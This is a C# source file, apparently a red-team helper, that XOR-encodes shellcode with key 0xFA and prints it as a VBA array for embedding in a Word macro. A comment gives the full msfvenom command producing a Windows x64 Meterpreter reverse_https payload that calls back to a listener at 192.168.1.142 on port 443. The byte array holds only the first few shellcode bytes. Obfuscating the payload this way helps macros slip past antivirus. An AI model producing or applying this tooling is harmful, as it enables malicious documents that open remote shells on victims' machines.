using System;
using System.Text;

namespace EncryptVBA
{
    class Program
    {
        static void Main(string[] args)
        {
// msfvenom -p windows/x64/meterpreter/reverse_https SessionExpirationTimeout=0 SessionCommunicationTimeout=0 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
// if is 32 bits Word, change the payload.
// copy the entire payload from msfvenom

            byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00 };

            byte key = 0xfa;
            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(buf[i] ^ key);
            }

            StringBuilder hex = new StringBuilder();
            hex.Append("buf = Array(");
            for (int i = 0; i < encoded.Length; i++)
            {
                hex.AppendFormat("{0}, ", encoded[i]);
                if ((i + 1) % 50 == 0)
                {
                    hex.Append("_\n");
                }
            }
            hex.Length -= 2;
            hex.Append(")");

            Console.WriteLine("XORed VBA Payload (Key: 0xFA and Decimal: 250):");
            Console.WriteLine(hex.ToString());
        }
    }
}
